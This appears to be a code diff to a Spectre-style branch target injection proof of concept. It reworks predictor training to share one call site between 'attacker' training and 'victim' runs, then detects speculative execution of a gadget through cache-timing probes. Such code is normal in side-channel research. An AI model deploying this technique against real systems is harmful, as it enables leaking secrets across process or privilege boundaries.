@@ -36,10 +36,10 @@
 
 #include "run_sequence.h"
 
-FuncPtr victim_funcs[ARRAY_SIZE] = {};
-FuncPtr attacker_funcs[ARRAY_SIZE] = {};
-FuncPtr& victim_final_func = victim_funcs[ARRAY_SIZE - 1];
-FuncPtr& attacker_final_func = attacker_funcs[ARRAY_SIZE - 1];
+FuncPtr funcs[ARRAY_SIZE] = {};
+// Volatile so the compiler treats every call as an opaque indirect dispatch
+// and never duplicates the call site across if/else branches.
+static void (* volatile run_seq)(FuncPtr*, void*) = run_sequence;
 void *probe_buf __attribute__((aligned(CACHELINE_SIZE))) = nullptr;
 void *train_buf __attribute__((aligned(CACHELINE_SIZE))) = nullptr;
 static volatile unsigned char sink = 0;
@@ -94,13 +94,10 @@ void initialize_functions() {
     FuncPtr choices[] = {fn0, fn1, fn2, fn3};
 
     for (int i = 0; i < ARRAY_SIZE - 1; ++i) {
-        FuncPtr choice = choices[(i * 7 + 3) & 3];
-        victim_funcs[i] = choice;
-        attacker_funcs[i] = choice;
+        funcs[i] = choices[(i * 7 + 3) & 3];
     }
 
-    victim_final_func = final_legitimate;
-    attacker_final_func = final_gadget;
+    funcs[ARRAY_SIZE - 1] = final_gadget;
 }
 
 void* alloc_buf(int num_pages) {
@@ -132,19 +129,6 @@ static void pin_cpu(int cpu) {
     }
 }
 
-static void train_predictor() {
-    for (int i = 0; i < TRAIN_REPS; ++i) {
-        run_sequence(attacker_funcs, train_buf);
-    }
-}
-
-static void victim_attempt() {
-    _mm_clflush(&victim_final_func);
-    _mm_mfence();
-    run_sequence(victim_funcs, probe_buf);
-    _mm_mfence();
-}
-
 int main() {
     const int cpu = 0;
 
@@ -158,11 +142,32 @@ int main() {
     unsigned int lcg_state = 1;
     int hits = 0;
 
-    for (int i = 0; i < ITERS; ++i) {
-        train_predictor();
+    void* buf_choice[2] = {train_buf, probe_buf};
 
+    for (int i = 0; i < ITERS; ++i) {
+        // Flush probe buf BEFORE training so the GBH is not clobbered
+        // between the last training call and the victim call.
         flush_buffer(probe_buf, PAGE_SIZE * NUM_PAGES);
-        victim_attempt();
+
+        // TRAIN_REPS training iterations (v=0) followed by 1 victim
+        // iteration (v=1), all sharing the same call instruction so the
+        // predictor's path history matches between the two.
+        //
+        // Each iteration writes and flushes funcs[ARRAY_SIZE-1] to keep
+        // the load slow (forcing the CPU to speculate) and to set the
+        // correct in-memory target: final_gadget during training so the
+        // predictor learns that target, final_legitimate for the victim so
+        // the speculative call is the only thing that touches probe_buf.
+        // Doing this unconditionally avoids any if/else that could cause
+        // the compiler to peel the last iteration into a separate call site.
+        FuncPtr final_choices[2] = {final_gadget, final_legitimate};
+        for (int j = 0; j <= TRAIN_REPS; ++j) {
+            int v = (j == TRAIN_REPS);
+            funcs[ARRAY_SIZE - 1] = final_choices[v];
+            _mm_clflush(&funcs[ARRAY_SIZE - 1]);
+            _mm_mfence();
+            run_seq(funcs, buf_choice[v]);
+        }
 
         int found = probe(probe_buf, NUM_PAGES, THRESHOLD, order, &lcg_state);
         if (found == GADGET_PAGE) {
